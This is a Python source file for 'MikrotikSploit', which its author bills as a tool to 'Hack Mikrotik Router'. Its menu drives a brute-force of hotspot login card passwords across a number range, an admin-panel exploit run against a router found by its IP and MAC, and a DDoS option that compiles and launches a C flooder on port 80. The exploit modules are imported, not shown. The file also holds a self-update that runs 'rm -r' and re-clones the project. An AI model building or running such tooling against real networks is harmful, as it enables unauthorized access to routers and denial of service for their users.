#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** MikrotikSploit ***
# * Version:
#   v0.1
# * Date:
#   28 - 08 - 2019 { Wed 28 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************

import re
import sys
import os
import time
import requests
import subprocess
from tools import asc, EX818M
from color import *
sys.path.append('core/ex818m/')
from ex818m import MAIN, write, cou
sys.path.append('core/ExploitPanelAdmin/')
from find import MAC
from run import RUN

def CLEAR():
    if sys.platform.startswith("win") is True:
        os.system("clr")
    else:
        os.system("clear")


def URL_CLEAR(url):
    _RE_ = re.split(r"ht[a-z]p\:\/\/|/", url)
    if "http" in url:url = _RE_[1]
    elif "/" in url:url = _RE_[0]
    else:url = url
    return url


def timeS():
    s = time.ctime().replace(' ', ':').split(':')[3:6]
    m = f"[{s[0]}:{s[1]}:{s[2]}]"
    return m


def Inf():

    print(""" 
Name        : Hathem Ahmed (MHM)
Facebook    : https://FB.COM/mhm.hack
Github      : https://github.com/HathemAhmed
Version     : v0.1
info script : this script for Hack Mikrotik Router """)
    input(f"{WOW}\n\n++++++ (Enter) ++++++{N}")

    CLEAR()

def writeEr(u,i,x):
    open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                                               f" Error Getting Password Cards Page Login My Network\n{timeS()} Error "
                                               f"Url={u} Min Number={i} Max Number={x}")
class LOOP:
    def __init__(self):
        self._NUM_ = int()
        self.find = True
        self.find1 = True
        self.find2 = True
        self._S_ = EX818M()

    def EX_818(self):
        CLEAR()

        print(self._S_[0])

        url = input(f"{W}[{P} * {W}]{B} Enter the URL Page Login{N}: ")
        minnum = input(f"{W}[{P} * {W}]{B} Enter the Min Number {N}: ")
        maxnum = input(f"{W}[{P} * {W}]{B} Enter the Max Number {N}: ")

        url = URL_CLEAR(url=url)

        try:

            MAIN().run(url,minnum,maxnum)

        except Exception as e:
            print(f"{W}[{R} - {W}]{B} Error For url OR numbers !!!\n{W}[{R} !!! {W}]{B} {e}")
            writeEr(url,minnum,maxnum)
            
        except requests.exceptions.ConnectionError as e:
            print(f"{W}[{R} - {W}]{B} Error For url !!!!\n{W}[{R} !!! {W}]{B} {e}")

    def ExploitBox(self):
        global adders, macks

        try:
            adders, macks = MAC().soRun()

        except:
            self.find = False

            open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                                               f" Error Exploit Mikrotik Admin Panel\n{timeS()} Error "
                                               f"IP=? MACK=?")

            sys.exit(2)

        if self.find is True:
            asc1 = input(f"{W}[{P} * {W}]{B} IP Address Your Router {adders} {W}[{P}y{W}/{R}n{W}]{N}:").upper()

            if asc1 == "N":
                self.find1 = False
            else:
                adders = adders

        if self.find1 is False:
            if self.find is False:
                adders = input(f"{W}[{R} - {W}]{B} Enter Your IP Router{N}: ")
            else:
                adders = input(f"{W}[{R} - {W}]{B} Enter Your IP Router{N}: ")

            # End IP Address

        if self.find is True:
            asc2 = input(f"{W}[{P} * {W}]{B} MAC Address Your Router {macks} {W}[{P}y{W}/{R}n{W}]{N}:").upper()

            if asc2 == "N":
                self.find2 = False
            else:
                macks = macks

        if self.find2 is False:
            if self.find is False:
                macks = input(f"{W}[{R} - {W}]{B} Enter Your MAC Router{N}: ")
            else:
                macks = input(f"{W}[{R} - {W}]{B} Enter Your MAC Router{N}: ")

            # End MAC Router

        try:
            write(f"\n\n{WOW}Exploiting .................{N}", 10)

            run = RUN().soRun2(macks)

            print(run)

        except TimeoutError:

            print(f"{W}[{R} - {W}]{B} Sorry Not Find Exploit For Your Router {N}")

    def DDos(self):

        CLEAR()

        print(self._S_[1])

        url = input(f"{W}[{P} * {W}]{B} Enter the URL For DoDs{N}: ")

        url = URL_CLEAR(url=url)

        write(f"{WOW} Please white .................{N}", 10)

        os.system("gcc -s ./core/DDoS/DDoS.c -o ./core/DDoS/DDoS")

        try:

            " %s " % os.system(f"./core/DDoS/DDoS {url} {80}")

        except OSError:
            open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                                               f" DDoS for Your NetWork\n{timeS()} Error "
                                               f"Url={url} Port={80}")

    def LOOPS(self):
        try:
            while True:
                self.find = True
                self.find1 = True
                self.find2 = True

                _ASC_ = asc()

                if _ASC_.strip() is "1":

                    self.EX_818()

                elif _ASC_.strip() is "2":

                    self.ExploitBox()

                elif _ASC_.strip() is "3":

                    self.DDos()

                elif _ASC_.strip() is "4":

                    Inf()

                elif _ASC_.strip() is "5":
                    ASCY = input("[ {R}!{N} ] Are you sure For Remove MikrotikSploit and UPDATE [Y/N]: ")

                    if ASCY.upper()[0] == "Y":
                        UB = os.system('cd ../&& rm -r MikrotikSploit && git clone https://github.com/hathemahmed/MikrotikSploit.git')
                        if UB != 0x00:
                            print("[{R}!{N}] Error For UPDATE")
                            exit()
                        else:
                            print("[ {B}+{N} ] Done UPDATE !")
                            exit()

                    else:pass
                
                elif _ASC_.strip() is "6":
                    exit()

        except KeyboardInterrupt:
            CLEAR()

            self.LOOPS()
